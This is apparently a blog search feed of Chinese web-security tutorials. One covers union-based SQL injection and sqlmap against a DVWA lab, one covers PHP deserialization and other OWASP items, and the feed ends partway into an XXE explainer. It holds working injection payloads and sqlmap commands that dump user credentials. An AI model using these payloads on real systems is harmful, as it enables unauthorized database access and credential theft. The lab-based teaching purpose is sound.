<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入之整数型注入、工具注入SQLmap</title>
      <link href="/2023/09/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%81%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5SQLmap/"/>
      <url>/2023/09/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%81%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5SQLmap/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入之整数型注入、工具注入SQLmap"><a href="#SQL注入之整数型注入、工具注入SQLmap" class="headerlink" title="SQL注入之整数型注入、工具注入SQLmap"></a>SQL注入之整数型注入、工具注入SQLmap</h1><p>什么是sql注入可以参考我以前的文章：<a href="https://carrotst.github.io/2023/09/16/sql%E6%B3%A8%E5%85%A5%E6%BA%90%E4%BB%A3%E7%A0%81-%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%8A%82/">https://carrotst.github.io/2023/09/16/sql%E6%B3%A8%E5%85%A5%E6%BA%90%E4%BB%A3%E7%A0%81-%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%8A%82/</a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><code>phpstudy、dvwa、kali linux</code></p><p>先把<code>dvwa</code>环境搭起来，可以参考网上的文章！！！</p><p><strong>实验前先把 难度改成</strong> <code>low</code></p><h2 id="什么是联合注入"><a href="#什么是联合注入" class="headerlink" title="什么是联合注入"></a>什么是联合注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 表名 from 列名 union select 表名 from 列名 where 字段ID;</span><br></pre></td></tr></table></figure><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; order by 1 #</span></span><br></pre></td></tr></table></figure><p>没有报错说明存在有这个字段</p><p>直到报错就可以停了</p><p><img src="https://picss.sunbangyan.cn/2023/09/22/10svnbr.png"></p><p><strong>1 2 都是没有报错，说明存在 1 2字段；</strong></p><p>那就直接可以查看库名了</p><p><strong>mysql注释: #  –+</strong></p><p>不同版本都不一样</p><h3 id="常用的sql语句"><a href="#常用的sql语句" class="headerlink" title="常用的sql语句"></a>常用的sql语句</h3><ul><li>user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 </li><li>version() 返回当前数据库的版本 </li><li>database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </li><li>group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </li><li>@@datadir 数据库路径 </li><li>@@version_compile_os 操作系统版本</li></ul><h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><a href="https://www.w3school.com.cn/sql/sql_select.asp">select</a> 语句用于从表中选取数据。<br><a href="https://www.w3school.com.cn/sql/sql_union.asp">union</a> 操作符用于合并两个或多个 SELECT 语句的结果集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,database()#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/QLCtgCzA.png"></p><h3 id="sql版本号"><a href="#sql版本号" class="headerlink" title="sql版本号"></a><strong>sql版本号</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select version(),database()#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/qrFDVgss.png"></p><p>解释一下 为啥 有 <code>‘ #</code> 这些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>看一下源代码</p><p>我们加了“ ‘ “ “ # “ 后——-#注释sql语句后面的内容</p><p><strong>在id&#x3D;1’ 后加上  “#” 即注释符号可将注释符号后的语句全部注释，这样我们就可以在注释符号前写入sql语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27;union select version(),database()#&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>如果里面是双引号那么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&quot;</span>union select <span class="title function_ invoke__">version</span>(),<span class="title function_ invoke__">database</span>()<span class="comment">#&quot;;&#x27;;</span></span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点:"></a>知识点:</h3><p>information_schema是mysql自带的库，记录了该数据库<strong>所有的表名和字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">schemata ----所有的数据库名</span><br><span class="line">schemata_name ---数据库名字</span><br><span class="line">tables ----所有表名</span><br><span class="line">table_schema -----表所属数据库名</span><br><span class="line">table_name ----表的名字</span><br><span class="line">columns ---所有字段的名字</span><br><span class="line">table_schema ---字段所属数据库的名字</span><br><span class="line">table_name ---字段所属表名</span><br><span class="line">column_name ---字段名</span><br></pre></td></tr></table></figure><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,database() from information_schema.schemata#</span><br><span class="line">id=1&#x27; union select 1,database()# 两个都是也一样的 上面只是直观看出</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/DQYTmFI7.png"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/nkE01uA4.png"></p><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure><p>看到了两个 关键的user password 就是我们要查看的</p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(user,password) from users#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/65m4HZDq.png"></p><p>可以隔开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(user,0x3a,password) from users#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/SesLvMiU.png"></p><p><strong>用户名 :admin</strong></p><p><strong>密码:5f4dcc3b5aa765d61d8327deb882cf99(password)</strong></p><h1 id="工具注入"><a href="#工具注入" class="headerlink" title="工具注入"></a>工具注入</h1><p>这个就简单了，直接使用sqlmap 梭哈！！</p><h2 id="必备知识点："><a href="#必备知识点：" class="headerlink" title="必备知识点："></a>必备知识点：</h2><table><thead><tr><th>–dbs</th><th>查看所有的数据库</th></tr></thead><tbody><tr><td>-D</td><td>指定数据库</td></tr><tr><td>-T –tables</td><td>查看数据表</td></tr><tr><td>-C –dump</td><td>查看字段（用逗号隔开）</td></tr></tbody></table><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取cookie:<span class="attribute">PHPSESSID</span>=lc1met8rfiqmjrq3orpab5cpic; <span class="attribute">security</span>=low</span><br></pre></td></tr></table></figure><h2 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;10.83.0.160:81/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27;</span> <span class="attr">--dbs</span> <span class="attr">--cookie</span>=<span class="string">&quot;PHPSESSID=lc1met8rfiqmjrq3orpab5cpic;security=low&quot;</span> <span class="attr">--batch</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/23/vxouBmFQ.png"></p><h2 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;10.83.0.160:81/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;PHPSESSID=lc1met8rfiqmjrq3orpab5cpic;security=low&quot; --batch -D dvwa --tables</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/23/RGY4K2eW.png"></p><h2 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;10.83.0.160:81/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;PHPSESSID=lc1met8rfiqmjrq3orpab5cpic;security=low&quot; --batch -D dvwa -T users --columns </span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/23/6tHigBvd.png"></p><h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;10.83.0.160:81/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;PHPSESSID=lc1met8rfiqmjrq3orpab5cpic;security=low&quot; --batch -D dvwa -T users -C &quot;user,password&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/23/k3fJplW9.png"></p><h1 id="结束！！！"><a href="#结束！！！" class="headerlink" title="结束！！！"></a>结束！！！</h1>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 源代码分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【第三章】常见漏洞OWASP-TOP-10</title>
      <link href="/2023/09/22/%E3%80%90%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/"/>
      <url>/2023/09/22/%E3%80%90%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/</url>
      
        <content type="html"><![CDATA[<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>什么是反序列话，简单来说就是</p><ul><li>序列化：就是将对象转化成字节序列的过程。</li><li>反序列化：就是讲字节序列转化成对象的过程。</li></ul><p>为什么有序列化呢？？？？，主要有两方面</p><ul><li>持久化：对象是存储在JVM中的堆区的，但是如果JVM停止运行了，对象也不存在了。序列化可以将对象转化成字节序列，可以写进硬盘文件中实现持久化。在新开启的JVM中可以读取字节序列进行反序列化成对象。</li><li>网络传输：网络直接传输数据，但是无法直接传输对象，可在传输前序列化，传输完成后反序列化成对象。所以所有可在网络上传输的对象都必须是可序列化的。</li></ul><p>总而言之，就是能将正向的对象 进行反向转换，哪它有什么危害呢?</p><ul><li>不安全的反序列化，主要造成的危害是远程代码执行</li><li>如果无法远程代码执行，也可能导致权限提升、任意文件读取、拒绝服务攻击等</li><li>也可能会造成远程命令执行，getshell。</li></ul><h2 id="实验案例："><a href="#实验案例：" class="headerlink" title="实验案例："></a>实验案例：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;carrot&#x27;</span>,<span class="string">&#x27;is&#x27;</span>,<span class="string">&#x27;good&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以最简单的例子来讲解反序列化</p><p>运行成功显示:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;carrot&quot;</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">&quot;is&quot;</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;good&quot;</span>;&#125;</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; carrot</span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="keyword">is</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; good</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">3</span>:&#123;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;carrot&quot;</span>;<span class="selector-tag">i</span>:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">&quot;is&quot;</span>;<span class="selector-tag">i</span>:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;good&quot;</span>;&#125;</span><br><span class="line"><span class="selector-tag">a</span>:array代表是数组，后面的<span class="number">3</span>说明有三个属性</span><br><span class="line">i:代表是整型数据int，后面的<span class="number">0</span>是数组下标</span><br><span class="line">s:代表是字符串，后面的<span class="number">6</span>是因为carrot长度为<span class="number">6</span></span><br><span class="line">依次类推</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是个正常输出的内容,我们注意到这个函数 <code>unserialize() </code>就是将对象进行反序列化</p><p>那我们也可以让他正着输出就是<code>serialize()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;carrotisgood&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;carrotnotgood&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行：</p><p>O代表Object是对象，也是类</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;carrotisgood&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;carrotnotgood&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="反序列化中常见的魔术方法"><a href="#反序列化中常见的魔术方法" class="headerlink" title="反序列化中常见的魔术方法"></a><strong>反序列化中常见的魔术方法</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="regexp">//</span>执行unserialize()时，先会调用这个函数__sleep() <span class="regexp">//</span>执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() <span class="regexp">//</span>对象被销毁时触发__call() <span class="regexp">//</span>在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() <span class="regexp">//</span>在静态上下文中调用不可访问的方法时触发__get() <span class="regexp">//</span>用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() <span class="regexp">//</span>用于将数据写入不可访问的属性__isset() <span class="regexp">//</span>在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() <span class="regexp">//</span>在不可访问的属性上使用unset()时触发__toString() <span class="regexp">//</span>把类当作字符串使用时触发</span><br><span class="line">__invoke() <span class="regexp">//</span>当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><blockquote><p>• 应该尽量避免用户输入反序列化的参数<br>• 如果确实需要对不受信任的数据源进行反序列化，需要确保数据未被篡改，比如使用数字签名来检查数据的完整性<br>• 严格控制反序列化相关函数的参数，坚持用户所输入的信息都是不可靠的原则<br>• 对于反序列化后的变量内容进行检查，以确定内容没有被污染<br>• 做好代码审计相关工作，提高开发人员的安全意识</p></blockquote><h1 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a><strong>不足的日志记录和监控</strong></h1><p>日志记录是一个系统的最重要的功能之一。日志记录包括登录成功记录、登录失败记录、访问控制记录等，用来记录服务器的各种信息。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。比如日志没有记录登录失败，那么攻击者可能就可以通过暴力破解多次进行登录尝试，但是日志中却没有记录。这就可能让攻击者成功入侵系统并隐匿自己的行踪。这个看似危害不大但却是十分严重的危害，因为一个日志系统不完善的服务器很容易遭受攻击并且在遭受攻击后无法判断攻击来源，这样就无法做出相应的防御，很可能再次遭受同样的攻击。</p><p>这种简单来讲就是，在登入的时候没有进行监控防御，导致攻击者可以无数次的进行密码暴破从而获取管理权限。</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul><li>确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间</li><li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对</li><li>完善日志系统，使其可以监控各种日志信息</li><li>及时对日志系统进行备份，并保存足够长时间</li></ul><h1 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a><strong>使用含有已知漏洞的组件</strong></h1><p>​这种就是出现Nday漏洞了，需要实时更新服务端、组件的版本。拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p><h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><p>例如 </p><ul><li>最经典的永恒之蓝漏洞，永恒之蓝-MS17010 CVE-2017-0146只要是 17年4月以下的系统都会受到攻击，直接获取最高权限</li><li>WinRAR 0day漏洞允许攻击者创建恶意 .RAR 和 .ZIP 存档，这些存档显示看似无害的诱饵文件，例如 JPG (.jpg) 图像、文本文件 (.txt) 或 PDF (.pdf)，用户双击使用winRAR打开查看压缩文件，并在winRAR窗口中点击查看时触发漏洞</li></ul><h2 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a>防护方式</h2><ul><li>识别正在使用的组件和版本，包括所有的依赖</li><li>更新组件或引用的库文件到最新</li><li>建立安全策略来管理组件的使用</li></ul>]]></content>
      
      
      <categories>
          
          <category> 常见漏洞 </category>
          
          <category> OWASP_TOP_10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 常见漏洞 </tag>
            
            <tag> OWASP </tag>
            
            <tag> 知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【第二章】常见漏洞OWASP-TOP-10</title>
      <link href="/2023/09/21/%E3%80%90%E7%AC%AC%E4%BA%8C%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/"/>
      <url>/2023/09/21/%E3%80%90%E7%AC%AC%E4%BA%8C%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/</url>
      
        <content type="html"><![CDATA[<h1 id="XML外部实体-XXE"><a href="#XML外部实体-XXE" class="headerlink" title="XML外部实体(XXE)"></a>XML外部实体(XXE)</h1><p><code>XXE</code> 漏洞这个肯定不陌生，已经是经典中的经典了，该漏洞允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p><code>XML</code>:可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。它被设计用来传输和存储数据(而不是储存数据),可扩展标记语言是一种很像超文本标记语言的标记语言。它的设计宗旨是传输数据，而不是显示数据。它的标签没有被预定义。您需要自行定义标签。它被设计为具有自我描述性。它是W3C的推荐标准。</p><p><code>XML</code>使用元素和属性来描述数 据。在数据传送过程中，<code>XML</code>始终保留了诸如父&#x2F;子关系这样的数据结构。几个应用程序 可以共享和解析同一个XML文件，不必使用传统的字符串解析或拆解过程。 相反，普通文件不对每个数据段做描述(除了在头文件中)，也不保留数据关系结构。使用XML做数据交换可以使应用程序更具有弹性，因为可以用位置(与普通文件一样)或用元素名(从数据库)来存取XML数据。</p><p><strong>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行</strong></p><h3 id="XXE漏洞的产生"><a href="#XXE漏洞的产生" class="headerlink" title="XXE漏洞的产生"></a>XXE漏洞的产生</h3><p>很多网站 都是使用<code>XML</code>格式在浏览器和服务器中数据传输，执行此操作的应用程序几乎总是使用标准库或平台<code> API</code> 来处理服务器上的 <code>XML </code>数据。</p><h3 id="XXE类型"><a href="#XXE类型" class="headerlink" title="XXE类型"></a>XXE类型</h3><p>执行此操作的应用程序几乎总是使用标准库或平台 API 来处理服务器上的 XML 数据。</p><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ⬆XML声明⬆ --&gt;</span></span><br><span class="line"></span><br><span class="line">DOCTYPE  文件名 [</span><br><span class="line"><span class="tag">&lt;<span class="name">ENTITY实体名</span> &quot;<span class="attr">实体内容</span>&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line">   <span class="comment">&lt;!-- ⬆XMLDTD文档定义⬆ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Luobo<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Carrot<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>good luck<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>hoooooo<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ⬆XML文档元素⬆ --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p><p><strong>内部声明DTD</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line">引用外部DTD文档</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">PUBLIC</span> <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>内部声明实体</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>引用外部实体</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">PUBLIC</span> <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>调用方式:&amp;实体名称;</strong></p><h2 id="示例演示"><a href="#示例演示" class="headerlink" title="示例演示"></a>示例演示</h2><p>演示前先去了解一下啥是XML：<a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧</a></p><p>使用的靶场:<a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a></p><p>(不会搭建的直接搜教程)</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;Carrot&quot;</span> &gt;</span> 